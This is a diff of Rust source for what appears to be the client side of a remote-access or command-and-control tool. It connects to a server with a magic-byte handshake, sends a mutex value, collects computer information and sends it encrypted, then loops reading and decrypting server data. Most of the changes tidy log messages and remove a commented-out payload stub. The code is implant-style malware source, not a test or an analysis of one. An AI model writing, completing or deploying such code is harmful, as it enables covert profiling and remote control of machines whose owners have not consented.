@@ -11,7 +11,7 @@ use aes_gcm::aead::consts::U32;
 use aes_gcm::aead::generic_array::GenericArray;
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Key, Nonce};
-use shared::commands::{BaseCommand, BaseResponse, Command};
+use shared::commands::BaseResponse;
 use shared::crypto::Encryption;
 use shared::types::ClientConfig;
 use smol::{
@@ -19,7 +19,6 @@ use smol::{
     io::{AsyncReadExt, AsyncWriteExt},
     net::TcpStream,
 };
-use std::mem::size_of;
 
 use crate::commands::computer_info;
 
@@ -81,31 +80,19 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         // like so: executor.spawn(async {});
         let mut stream = TcpStream::connect(socket).await?;
 
-        println!("[*] sending handshake");
+        println!("[*][main] sending handshake");
         stream.write_all(&[0x0a, 0xee, 0x7c, 0x9b, 0x32]).await?;
-        println!("[v] sent handshake");
-
-        println!("[*] waiting for response");
+        println!("[*][main] waiting for response");
         let mut response = [0; 5];
         stream.read_exact(&mut response).await?;
-        println!("[v] received response");
 
         if response == [0x32, 0x9b, 0x7c, 0xee, 0x0a] {
-            println!("[v] handshake successful");
+            println!("[v][main] handshake successful; sending mutex");
             stream.write_all(config.mutex.as_slice()).await?;
-            println!("[*] sent mutex, awaiting response...");
         } else {
-            println!("[x] handshake failed");
+            println!("[x][main] handshake failed");
             return Err("Failed handshake with server".into()); // drop out
         }
-
-        // send a payload here
-        /*let payload = b"hello world";
-        let payload_size = payload.len().to_le_bytes();
-        println!("[*] sending payload size of {}", payload.len());
-        stream.write_all(&payload_size).await?;
-        println!("[*] sending payload!");
-        stream.write_all(payload).await?;*/
 
         let encryption = Encryption::new(_key);
 
@@ -122,22 +109,21 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 bincode::encode_to_vec(computer_info_payload, bincode::config::standard()).unwrap(),
             )
             .await;
-            println!("[*] sent computer info to server");
         } else {
-            println!("[x] failed to send computer info");
+            println!("[x][main] failed to run computer_info::main");
         }
 
         match wait(stream, encryption).await {
             Ok(_) => {
-                println!("loop exited gracefully");
+                println!("[*][main] loop exited gracefully");
             }
             Err(e) => {
-                println!("[x] error waiting for response: {}", e);
+                println!("[x][main] error waiting for response: {}", e);
                 // return Err(e);
             }
         }; // nice little command loop
 
-        println!("[v] closing");
+        println!("[v][main] closing");
         Ok(())
     })
 }
@@ -149,30 +135,30 @@ async fn send(stream: &mut TcpStream, encryption: &Encryption, buf: Vec<u8>) {
         payload.extend_from_slice(&encrypted);
 
         let _ = shared::net::write(stream, &payload).await;
+        println!("[v][send] wrote payload (size:{}) to server", &buf.len());
     } else {
-        println!("[x] failed to write to client");
+        println!("[x][send] failed to write to server");
     }
 }
 
 async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::io::Error> {
-    println!("[*][wait()] entered loop");
+    println!("[*][wait] entered loop");
 
     loop {
         match shared::net::read(&mut stream).await {
             Ok(buf) => {
-                println!("[*] got sum shit from the server");
-
+                println!("[*][wait] reading data from server");
                 let mut nonce = [0u8; 12];
                 nonce.copy_from_slice(&buf[..12]);
                 let buffer = &buf[12..];
                 if let Ok(decrypted) = encryption.decrypt(&nonce, buffer) {
-                    println!("decrypted: {}", String::from_utf8_lossy(&decrypted));
+                    println!("[v][wait] decrypted payload (size:{})", &decrypted.len());
                 } else {
-                    println!("decryption failed!! wtf");
+                    println!("[x][wait] decryption failed");
                 }
             }
             Err(e) => {
-                println!("[x] {}", e);
+                println!("[x][wait] {}", e);
                 break Ok(());
             }
         };
